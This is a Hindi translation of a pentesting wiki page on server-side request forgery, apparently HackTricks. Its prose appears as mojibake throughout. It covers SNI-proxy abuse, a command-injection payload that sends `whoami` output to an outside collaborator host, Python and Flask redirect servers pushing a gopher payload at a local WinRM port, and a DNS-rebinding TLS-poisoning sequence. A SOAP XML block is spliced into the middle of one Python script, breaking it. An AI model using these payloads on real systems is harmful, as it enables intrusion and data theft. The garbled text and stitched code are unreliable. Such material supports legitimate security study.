### рдЗрд╕ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдореЗрдВ, рд╕рд░реНрд╡рд░ рдиреЗрдо рдЗрдВрдбрд┐рдХреЗрд╢рди (SNI) рдлрд╝реАрд▓реНрдб рд╕реЗ рдЖрдиреЗ рд╡рд╛рд▓реЗ рдорд╛рди рдХреЛ рд╕реАрдзреЗ рдмреИрдХрдПрдВрдб рдХрд╛ рдкрддрд╛ рдХреЗ рд░реВрдк рдореЗрдВ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред рдпрд╣ рд╕реЗрдЯрдЕрдк рд╕рд░реНрд╡рд░-рд╕рд╛рдЗрдб рд░рд┐рдХреНрд╡реЗрд╕реНрдЯ рдлрд╝реЙрд░реНрдЬрд░реА (SSRF) рдХреЗ рд▓рд┐рдП рдПрдХ рд╡рдВрд╢реНрд╡рджреНрд╡рд┐рдкреНрддрд┐ рдХреЛ рдЙрдЬрд╛рдЧрд░ рдХрд░рддрд╛ рд╣реИ, рдЬрд┐рд╕реЗ рд╕реАрдзреЗ SNI рдлрд╝реАрд▓реНрдб рдореЗрдВ рд╡рд╛рдВрдЫрд┐рдд рдЖрдИрдкреА рдкрддрд╛ рдпрд╛ рдбреЛрдореЗрди рдирд╛рдо рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдХрд░рдХреЗ рдЙрддреНрдкрд╛рджрд┐рдд рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред `internal.host.com` рдЬреИрд╕реЗ рдПрдХ рдЕрд░реНрдмрд┐рдЯреНрд░реЗ рдмреИрдХрдПрдВрдб рд╕реЗ рдХрдиреЗрдХреНрд╢рди рдмрдирд╛рдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХ рдЙрддреНрдкрд╛рджрди рдЙрджрд╛рд╣рд░рдг, `openssl` рдХрдорд╛рдВрдб рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдиреАрдЪреЗ рджрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ:
```bash
openssl s_client -connect target.com:443 -servername "internal.host.com" -crlf
```
## [Wget рдлрд╝рд╛рдЗрд▓ рдЕрдкрд▓реЛрдб](../file-upload/#wget-file-upload-ssrf-trick)

## рдХрдорд╛рдВрдб рдЗрдВрдЬреЗрдХреНрд╢рди рдХреЗ рд╕рд╛рде SSRF

рдпрд╣ рдПрдХ payload рдХреА рдХреЛрд╢рд┐рд╢ рдХрд░рдиреЗ рд▓рд╛рдпрдХ рд╣реЛ рд╕рдХрддрд╛ рд╣реИ: `` url=http://3iufty2q67fuy2dew3yug4f34.burpcollaborator.net?`whoami` ``

## PDFs рд░реЗрдВрдбрд░рд┐рдВрдЧ

рдпрджрд┐ рд╡реЗрдм рдкреГрд╖реНрда рд╕реНрд╡рдЪрд╛рд▓рд┐рдд рд░реВрдк рд╕реЗ рдПрдХ PDF рдмрдирд╛ рд░рд╣рд╛ рд╣реИ рдЬрд┐рд╕рдореЗрдВ рдХреБрдЫ рдЬрд╛рдирдХрд╛рд░реА рдЖрдкрдиреЗ рдкреНрд░рджрд╛рди рдХреА рд╣реИ, рддреЛ рдЖрдк **рдХреБрдЫ JS рдбрд╛рд▓ рд╕рдХрддреЗ рд╣реИрдВ рдЬреЛ PDF рдирд┐рд░реНрдорд╛рддрд╛** рдЦреБрдж (рд╕рд░реНрд╡рд░) рджреНрд╡рд╛рд░рд╛ рдХреНрд░рд┐рдПрдЯ рдХрд░рддреЗ рд╕рдордп рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛ рдФрд░ рдЖрдк SSRF рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░ рд╕рдХреЗрдВрдЧреЗред [**рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА рдпрд╣рд╛рдБ рджреЗрдЦреЗрдВ**](../xss-cross-site-scripting/server-side-xss-dynamic-pdf.md)**.**

## SSRF рд╕реЗ DoS рддрдХ

рдПрдХ рд╕реЗ рдЕрдзрд┐рдХ рд╕реЗрд╢рди рдмрдирд╛рдПрдВ рдФрд░ рд╕реЗрд╢рди рд╕реЗ SSRF рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдХреЗ рднрд╛рд░реА рдлрд╝рд╛рдЗрд▓реЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдиреЗ рдХреА рдХреЛрд╢рд┐рд╢ рдХрд░реЗрдВред

## SSRF PHP рдлрд╝рдВрдХреНрд╢рди

{% content-ref url="../../network-services-pentesting/pentesting-web/php-tricks-esp/php-ssrf.md" %}
[php-ssrf.md](../../network-services-pentesting/pentesting-web/php-tricks-esp/php-ssrf.md)
{% endcontent-ref %}

## SSRF рдЧреЛрдлрд░ рдХреЛ рд░реАрдбрд╛рдпрд░реЗрдХреНрдЯ рдХрд░реЗрдВ

рдХреБрдЫ рдЙрддреНрдкреАрдбрд╝рдиреЛрдВ рдХреЗ рд▓рд┐рдП рдЖрдкрдХреЛ **рд░реАрдбрд╛рдпрд░реЗрдХреНрдЯ рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рднреЗрдЬрдиреА** рдкрдбрд╝ рд╕рдХрддреА рд╣реИ (рд╕рдВрднрд╛рд╡рд┐рдд рд░реВрдк рд╕реЗ рдЧреЛрдлрд░ рдЬреИрд╕реЗ рд╡рд┐рднрд┐рдиреНрди рдкреНрд░реЛрдЯреЛрдХреЙрд▓ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП)ред рдпрд╣рд╛рдБ рдЖрдкрдХреЗ рдкрд╛рд╕ рд░реАрдбрд╛рдпрд░реЗрдХреНрдЯ рдХреЗ рд╕рд╛рде рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рджреЗрдиреЗ рдХреЗ рд▓рд┐рдП рд╡рд┐рднрд┐рдиреНрди рдкрд╛рдпрдерди рдХреЛрдб рд╣реИрдВ:
```python
# First run: openssl req -new -x509 -keyout server.pem -out server.pem -days 365 -nodes
from http.server import HTTPServer, BaseHTTPRequestHandler
import ssl

class MainHandler(BaseHTTPRequestHandler):
def do_GET(self):
print("GET")
self.send_response(301)
```html
<details>
<summary>рд╢реАрд░реНрд╖рдХ</summary>
    <p:Envelope xmlns:s="http://www.w3.org/2003/05/soap-envelope" xmlns:a="http://schemas.xmlsoap.org/ws/2004/08/addressing" xmlns:h="http://schemas.xmlsoap.org/ws/2004/08/addressing">
        <s:Header>
            <a:To>HTTP://192.168.1.1:5986/wsm/</a:To>
            <w:ResourceURI s:mustUnderstand="true">http://schemas.xmlsoap.org/ws/2004/08/addressing</w:ResourceURI>
            <a:ReplyTo>
                <a:Address s:mustUnderstand="true">http://schemas.xmlsoap.org/ws/2004/08/addressing/role/anonymouss</a:Address>
            </a:ReplyTo>
            <a:Action>http://schemas.xmlsoap.org/ws/2004/08/addressing/role/action</a:Action>
            <w:MessageID>uuid:0AB58087-C2C3-0005-0000-000000100000</w:MessageID>
            <w:OperationTimeout>PT1M30S</w:OperationTimeout>
            <w:Locale xml:lang="en-us" s:mustUnderstand="false"/>
            <w:OptionSet s:mustUnderstand="false"/>
            <w:OperationTimeout>0</w:OperationTimeout>
            <w:Locale xml:lang="en-us" s:mustUnderstand="false"/>
            <p:DataLocale xml:lang="en-us" s:mustUnderstand="false"/>
            <w:OperationTimeout>PT1M30S</w:OperationTimeout>
            <w:SelectorSet>
                <w:Selector Name="__cimnamespace">root/scx</w:Selector>
            </w:SelectorSet>
        </s:Header>
    </p:Envelope>
</details>
```
```python
self.end_headers()

httpd = HTTPServer(('0.0.0.0', 443), MainHandler)
httpd.socket = ssl.wrap_socket(httpd.socket, certfile="server.pem", server_side=True)
httpd.serve_forever()
```

```python
from flask import Flask, redirect
from urllib.parse import quote
app = Flask(__name__)

@app.route('/')
def root():
return redirect('gopher://127.0.0.1:5985/_%50%4f%53%54%20%2f%77%73%6d%61%6e%20%48%54%54%50%2f%31%2e%31%0d%0a%48%6f%73%74%3a%20', code=301)

if __name__ == "__main__":
app.run(ssl_context='adhoc', debug=True, host="0.0.0.0", port=8443)
```
<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВ рдФрд░ рдЖрд╕рд╛рдиреА рд╕реЗ **рдСрдЯреЛрдореЗрдЯ рд╡рд░реНрдХрдлрд╝реНрд▓реЛ** рдмрдирд╛рдПрдВ рдЬреЛ рджреБрдирд┐рдпрд╛ рдХреЗ **рд╕рдмрд╕реЗ рдЙрдиреНрдирдд** рд╕рдореБрджрд╛рдп рдЙрдкрдХрд░рдгреЛрдВ рджреНрд╡рд╛рд░рд╛ рд╕рдВрдЪрд╛рд▓рд┐рдд рд╣реИрдВред\
рдЖрдЬ рд╣реА рдкрд╣реБрдВрдЪ рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## DNS Rebidding CORS/SOP bypass

рдпрджрд┐ **CORS/SOP** рдХреЗ рдХрд╛рд░рдг **рд╕реНрдерд╛рдиреАрдп IP рд╕реЗ рд╕рд╛рдордЧреНрд░реА рдХреЛ рдмрд╛рд╣рд░ рд▓реЗ рдЬрд╛рдиреЗ рдореЗрдВ рд╕рдорд╕реНрдпрд╛** рд╣реИ, рддреЛ **DNS Rebidding** рдХрд╛ рдЙрдкрдпреЛрдЧ рдЙрд╕ рд╕реАрдорд╛ рдХреЛ рджреМрд░ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ:

{% content-ref url="../cors-bypass.md" %}
[cors-bypass.md](../cors-bypass.md)
{% endcontent-ref %}

### рд╕реНрд╡рдЪрд╛рд▓рд┐рдд DNS Rebidding

[**`Singularity of Origin`**](https://github.com/nccgroup/singularity) рдПрдХ рдЙрдкрдХрд░рдг рд╣реИ рдЬреЛ [DNS rebinding](https://en.wikipedia.org/wiki/DNS\_rebinding) рд╣рдорд▓реЗ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╣реИред рдпрд╣ рдЖрд╡рд╢реНрдпрдХ рдШрдЯрдХ рд╢рд╛рдорд┐рд▓ рдХрд░рддрд╛ рд╣реИ рддрд╛рдХрд┐ рд╣рдорд▓реЗ рдХрд░рдиреЗ рд╡рд╛рд▓реЗ рд╕рд░реНрд╡рд░ DNS рдирд╛рдо рдХрд╛ IP рдкрддрд╛ рд▓рдХреНрд╖реНрдп рдорд╢реАрди рдХреЗ IP рдкрддреЗ рдкрд░ рдкреБрдирд░рд╛рд╡реГрддреНрддрд┐ рдХрд░ рд╕рдХреЗрдВ рдФрд░ рд▓рдХреНрд╖реНрдп рдорд╢реАрди рдкрд░ рдХрдордЬреЛрд░ рд╕реЙрдлрд╝реНрдЯрд╡реЗрдпрд░ рдХрд╛ рд╢реЛрд╖рдг рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╣рдорд▓реЗ рдХреЗ рдкреЗрдпрд▓реЛрдб рд╕реЗрд╡ рдХрд░ рд╕рдХреЗрдВред

рджреЗрдЦреЗрдВ рднреА **рд╕рд╛рд░реНрд╡рдЬрдирд┐рдХ рд░реВрдк рд╕реЗ рдЪрд▓ рд░рд╣реЗ рд╕рд░реНрд╡рд░ рдХреЛ** [**http://rebind.it/singularity.html**](http://rebind.it/singularity.html)

## DNS Rebidding + TLS Session ID/Session ticket

рдЖрд╡рд╢реНрдпрдХрддрд╛рдПрдВ:

* **SSRF**
* **рдЖрдЙрдЯрдмрд╛рдЙрдВрдб TLS рд╕рддреНрд░**
* **рд╕реНрдерд╛рдиреАрдп рдкреЛрд░реНрдЯ рдкрд░ рд╕рд╛рдордЧреНрд░реА**

рд╣рдорд▓рд╛:

1. рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛/рдмреЙрдЯ рд╕реЗ рдХрд╣реЗрдВ рдХрд┐ рд╡рд╣ **рд╣рдорд▓реЗ рдХрд░рдиреЗ рд╡рд╛рд▓реЗ** рд╡реНрдпрдХреНрддрд┐ рджреНрд╡рд╛рд░рд╛ рдирд┐рдпрдВрддреНрд░рд┐рдд рдПрдХ **рдбреЛрдореЗрди** рддрдХ рдкрд╣реБрдВрдЪреЗрдВ
2. **DNS** рдХрд╛ **TTL** **0** рд╕реЗрдХрдВрдб рд╣реИ (рдЗрд╕рд▓рд┐рдП рдкреАрдбрд╝рд┐рдд рдЬрд▓реНрдж рд╣реА рдбреЛрдореЗрди рдХрд╛ IP рдЬрд╛рдВрдЪреЗрдЧрд╛)
3. рдкреАрдбрд╝рд┐рдд рдФрд░ рд╣рдорд▓реЗ рдХрд░рдиреЗ рд╡рд╛рд▓реЗ рдбреЛрдореЗрди рдХреЗ рдмреАрдЪ рдПрдХ **TLS рдХрдиреЗрдХреНрд╢рди** рдмрдирд╛рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред рд╣рдорд▓реЗ рдХрд░рдиреЗ рд╡рд╛рд▓реЗ рд╡реНрдпрдХреНрддрд┐ рдЙрд╕ **рд╕рддреНрд░ ID рдпрд╛ рд╕рддреНрд░ рдЯрд┐рдХрдЯ** рдореЗрдВ **рдкреЗрдпрд▓реЛрдб рдбрд╛рд▓рддрд╛ рд╣реИ**ред
4. **рдбреЛрдореЗрди** рдЕрдкрдиреЗ рдЖрдк рдХреЛ **рдирд┐рд░рдВрддрд░ рдкреБрдирд░реНрдирд┐рд░реНрджреЗрд╢рд┐рдд рдХрд░реЗрдЧрд╛**ред рдЗрд╕рдХрд╛ рдЙрджреНрджреЗрд╢реНрдп рдпрд╣ рд╣реИ рдХрд┐ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛/рдмреЙрдЯ рдбреЛрдореЗрди рддрдХ рдкрд╣реБрдВрдЪреЗрдВ рдЬрдм рддрдХ рд╡рд╣ рдлрд┐рд░ рд╕реЗ рдбреЛрдореЗрди рдХрд╛ **DNS рдЕрдиреБрд░реЛрдз** рдХрд░рддрд╛ рд╣реИред
5. DNS рдЕрдиреБрд░реЛрдз рдореЗрдВ **рдПрдХ рдирд┐рдЬреА IP** рдкрддрд╛ рджрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ **рдЕрдм** (рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП 127.0.0.1)
6. рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛/рдмреЙрдЯ рдЯреАрдПрд▓рдПрд╕ рдХрдиреЗрдХреНрд╢рди **рдкреБрдирдГ рд╕реНрдерд╛рдкрд┐рдд рдХрд░рдиреЗ рдХреА рдХреЛрд╢рд┐рд╢ рдХрд░реЗрдЧрд╛** рдФрд░ рдЗрд╕реЗ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╡рд╣ **рд╕рддреНрд░** рдЖрдИрдбреА/рдЯрд┐рдХрдЯ рдЖрдИрдбреА рднреЗрдЬреЗрдЧрд╛ (рдЬрд┐рд╕рдореЗрдВ рд╣рдорд▓реЗ рдХрд░рдиреЗ рд╡рд╛рд▓реЗ рдХрд╛ рдкреЗрдпрд▓реЛрдб рд╢рд╛рдорд┐рд▓ рдерд╛)ред рддреЛ рдмрдзрд╛рдИ рд╣реЛ, рдЖрдкрдиреЗ рдкреНрд░рдмрдВрдзрди рдХрд┐рдпрд╛ рд╣реИ рдХрд┐ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛/рдмреЙрдЯ рдЦреБрдж рдкрд░ рд╣рдорд▓рд╛ рдХрд░реЗрдВред

рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рдЗрд╕ рд╣рдорд▓реЗ рдХреЗ рджреМрд░рд╛рди, рдпрджрд┐ рдЖрдк localhost:11211 (_рдореЗрдордХреИрд╢_) рдкрд░ рд╣рдорд▓рд╛ рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ рддреЛ рдЖрдкрдХреЛ рдкреАрдбрд╝рд┐рдд рдХреЛ www.attacker.com:11211 рдХреЗ рд╕рд╛рде рдкреНрд░рд╛рд░рдВрднрд┐рдХ рдХрдиреЗрдХреНрд╢рди рд╕реНрдерд╛рдкрд┐рдд рдХрд░рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реИ (рдкреЛрд░реНрдЯ рд╣рдореЗрд╢рд╛ рд╕рдорд╛рди рд╣реЛрдирд╛ рдЪрд╛рд╣рд┐рдП)ред\
рдЗрд╕ рд╣рдорд▓реЗ рдХреЛ **рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЖрдк рдЗрд╕ рдЙрдкрдХрд░рдг рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ**: [https://github.com/jmdx/TLS-poison/](https://github.com/jmdx/TLS-poison/)\
**рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА** рдХреЗ рд▓рд┐рдП рдЙрд╕ рд╡рд╛рд░реНрддрд╛ рдХреЛ рджреЗрдЦреЗрдВ рдЬрд┐рд╕рдореЗрдВ рдЗрд╕ рд╣рдорд▓реЗ рдХреА рд╡реНрдпрд╛рдЦреНрдпрд╛ рдХреА рдЧрдИ рд╣реИ: [https://www.youtube.com/watch?v=qGpAJxfADjo\&ab\_channel=DEFCONConference](https://www.youtube.com/watch?v=qGpAJxfADjo\&ab\_channel=DEFCONConference)

## рдмреНрд▓рд╛рдЗрдВрдб SSRF

рдмреНрд▓рд╛рдЗрдВрдб SSRF рдФрд░ рдПрдХ рдЧреИрд░ рдмреНрд▓рд╛рдЗрдВрдб SSRF рдХреЗ рдмреАрдЪ рдЕрдВрддрд░ рдпрд╣ рд╣реИ рдХрд┐ рдмреНрд▓рд╛рдЗрдВрдб рдореЗрдВ рдЖрдк SSRF рдЕрдиреБрд░реЛрдз рдХрд╛ рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рдирд╣реАрдВ рджреЗрдЦ рд╕рдХрддреЗред рдлрд┐рд░, рдЗрд╕реЗ рдЙрддреНрдкрд╛рджрд┐рдд рдХрд░рдирд╛ рдЕрдзрд┐рдХ рдХрдард┐рди рд╣реЛ рдЬрд╛рддрд╛ рд╣реИ рдХреНрдпреЛрдВрдХрд┐ рдЖрдк рдХреЗрд╡рд▓ рдкреНрд░рд╕рд┐рджреНрдз рджреБрд░реБрдкрдпреЛрдЧ рдХрд░ рд╕рдХреЗрдВрдЧреЗред

### рд╕рдордп рдЖрдзрд╛рд░рд┐рдд SSRF

рд╕рд░реНрд╡рд░ рд╕реЗ рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛рдУрдВ рдХрд╛ рд╕рдордп рдЬрд╛рдВрдЪрдХрд░ рдпрд╣ рд╕рдВрднрд╡ рд╣реЛ рд╕рдХрддрд╛ рд╣реИ рдХрд┐ рдХреЛрдИ рд╕рдВрд╕рд╛рдзрди рд╣реИ рдпрд╛ рдирд╣реАрдВ (рд╢рд╛рдпрдж рдХрд┐рд╕реА рдореМрдЬреВрджрд╛ рд╕рдВрд╕рд╛рдзрди рддрдХ рдкрд╣реБрдВрдЪрдиреЗ рдореЗрдВ рдПрдХ рд╕рдВрд╕рд╛рдзрди рд╕реЗ рдЕрдзрд┐рдХ рд╕рдордп рд▓рдЧрддрд╛ рд╣реИ рдЬреЛ рдореМрдЬреВрдж рдирд╣реАрдВ рд╣реИ)

## рдХреНрд▓рд╛рдЙрдб SSRF рд╢реЛрд╖рдг

рдпрджрд┐ рдЖрдк рдХрд┐рд╕реА рдХреНрд▓рд╛рдЙрдб рдкрд░рд┐рд╡реЗрд╢ рдореЗрдВ рдЪрд▓ рд░рд╣реА рдорд╢реАрди рдореЗрдВ рдПрдХ SSRF рджреБрд░реБрдкрдпреЛрдЧрд┐рддрд╛ рдкрд╛рддреЗ рд╣реИрдВ рддреЛ рдЖрдк рдХреНрд▓рд╛рдЙрдб рдкрд░рд┐рд╡реЗрд╢ рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рджрд┐рд▓рдЪрд╕реНрдк рдЬрд╛рдирдХрд╛рд░реА рдкреНрд░рд╛рдкреНрдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рдпрд╣рд╛рдВ рддрдХ рдХрд┐ рдкреНрд░рдорд╛рдг рдкреНрд░рд╛рдкреНрдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:

{% content-ref url="cloud-ssrf.md" %}
[cloud-ssrf.md](cloud-ssrf.md)
{% endcontent-ref %}

## SSRF рд╡рд┐рдХрд▓реНрдкрд╢реАрд▓ рдкреНрд▓реЗрдЯрдлрд╝реЙрд░реНрдо

рдХрдИ рдЬрд╛рдиреЗ рдЬрд╛рдиреЗ рд╡рд╛рд▓реЗ рдкреНрд▓реЗрдЯрдлрд╝реЙрд░реНрдо рдореЗрдВ SSRF рджреБрд░реБрдкрдпреЛрдЧрд┐рддрд╛рдПрдБ рд╣реЛрддреА рд╣реИрдВ рдпрд╛ рд╣реЛрддреА рдереАрдВ, рдЙрдиреНрд╣реЗрдВ рдЪреЗрдХ рдХрд░реЗрдВ:

{% content-ref url="ssrf-vulnerable-platforms.md" %}
[ssrf-vulnerable-platforms.md](ssrf-vulnerable-platforms.md)
{% endcontent-ref %}

## рдЙрдкрдХрд░рдг

### [**SSRFMap**](https://github.com/swisskyrepo/SSRFmap)

SSRF рджреБрд░реБрдкрдпреЛрдЧрд┐рддрд╛рдПрдБ рдЦреЛрдЬрдиреЗ рдФрд░ рдЙрдиреНрд╣реЗрдВ рдЙрддреНрдкрдиреНрди рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдХрд░рдг

### [Gopherus](https://github.com/tarunkant/Gopherus)

* [Gopherus рдкрд░ рдмреНрд▓реЙрдЧ рдкреЛрд╕реНрдЯ](https://spyclub.tech/2018/08/14/2018-08-14-blog-on-gopherus/)

рдпрд╣ рдЙрдкрдХрд░рдг рдЬрдирд░реЗрдЯ рдХрд░рддрд╛ рд╣реИ Gopher payloads рдЗрд╕рдХреЗ рд▓рд┐рдП:

* MySQL
* PostgreSQL
* FastCGI
* Redis
* Zabbix
* Memcache

### [remote-method-guesser](https://github.com/qtc-de/remote-method-guesser)

* [SSRF рдЙрдкрдпреЛрдЧ рдкрд░ рдмреНрд▓реЙрдЧ рдкреЛрд╕реНрдЯ](https://blog.tneitzel.eu/posts/01-attacking-java-rmi-via-ssrf/)

_remote-method-guesser_ рдПрдХ _Java RMI_ рд╡рдВрд╢рд╛рдЬрддрд╛ рд╕реНрдХреИрдирд░ рд╣реИ рдЬреЛ рд╕рдмрд╕реЗ рд╕рд╛рдорд╛рдиреНрдп _Java RMI_ рджреБрд░реБрдкрдпреЛрдЧрд┐рддрд╛рдУрдВ рдХреЗ рд▓рд┐рдП рд╣рдорд▓реЗ рдХреЗ рдСрдкрд░реЗрд╢рди рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рддрд╛ рд╣реИред рдЙрдкрд▓рдмреНрдз рдСрдкрд░реЗрд╢рдиреЛрдВ рдореЗрдВ рд╕реЗ рдЕрдзрд┐рдХрддрдо `--ssrf` рд╡рд┐рдХрд▓реНрдк рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рддреЗ рд╣реИрдВ, рдЕрдиреБрд░реЛрдзрд┐рдд рдСрдкрд░реЗрд╢рди рдХреЗ рд▓рд┐рдП _SSRF_ рдкреЗрдпрд▓реЛрдб рдЙрддреНрдкрдиреНрди рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдПред `--gopher` рд╡рд┐рдХрд▓реНрдк рдХреЗ рд╕рд╛рде, рд╕реАрдзреЗ рдЙрдкрдпреЛрдЧ рдХреЗ рд▓рд┐рдП _gopher_ payloads рд╕реАрдзреЗ рдЙрддреНрдкрдиреНрди рдХрд┐рдП рдЬрд╛ рд╕рдХрддреЗ рд╣реИрдВред

### [SSRF Proxy](https://github.com/bcoles/ssrf\_proxy)

SSRF Proxy рдПрдХ рдорд▓реНрдЯреА-рдереНрд░реЗрдбреЗрдб HTTP рдкреНрд░реЙрдХреНрд╕реА рд╕рд░реНрд╡рд░ рд╣реИ рдЬреЛ рдХреНрд▓рд╛рдЗрдВрдЯ HTTP рдЯреНрд░реИрдлрд╝рд┐рдХ рдХреЛ HTTP рд╕рд░реНрд╡рд░ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдЯрдирд▓ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдбрд┐рдЬрд╝рд╛рдЗрди рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ рдЬреЛ рд╕рд░реНрд╡рд░-рд╕рд╛рдЗрдб рдЕрдиреБрд░реЛрдз рдлреЛрд░реНрдЬрд░реА (SSRF) рдХреЗ рд▓рд┐рдП рд╡рд┐рдХрд▓реНрдкрд╢реАрд▓ рд╣реИред

### рдЕрднреНрдпрд╛рд╕ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП

{% embed url="https://github.com/incredibleindishell/SSRF_Vulnerable_Lab" %}

## рд╕рдВрджрд░реНрдн

* [https://medium.com/@pravinponnusamy/ssrf-payloads-f09b2a86a8b4](https://medium.com/@pravinponnusamy/ssrf-payloads-f09b2a86a8b4)
* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery)
* [https://www.invicti.com/blog/web-security/ssrf-vulnerabilities-caused-by-sni-proxy-misconfigurations/](https://www.invicti.com/blog/web-security/ssrf-vulnerabilities-caused-by-sni-proxy-misconfigurations/)

<details>

<summary><strong>рд╢реВрдиреНрдп рд╕реЗ рд╣реАрд░реЛ рддрдХ AWS рд╣реИрдХрд┐рдВрдЧ рд╕реАрдЦреЗрдВ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> рдХреЗ рд╕рд╛рде!</strong></summary>

HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рдиреЗ рдХреЗ рдЕрдиреНрдп рддрд░реАрдХреЗ:

* рдпрджрд┐ рдЖрдк рдЕрдкрдиреА **рдХрдВрдкрдиреА рдХрд╛ рд╡рд┐рдЬреНрдЮрд╛рдкрди HackTricks рдореЗрдВ рджреЗрдЦрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ** рдпрд╛ **HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ** рддреЛ [**рд╕рдмреНрд╕рдХреНрд░рд┐рдкреНрд╢рди рдкреНрд▓рд╛рди**](https://github.com/sponsors/carlospolop) рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ!
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS & HackTricks рд╕реНрд╡реИрдЧ**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* рд╣рдорд╛рд░реЗ рд╡рд┐рд╢реЗрд╖ [**NFTs**](https://opensea.io/collection/the-peass-family) рдХрд▓реЗрдХреНрд╢рди [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдЦреЛрдЬреЗрдВ
* **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** ЁЯТм [**рдбрд┐рд╕
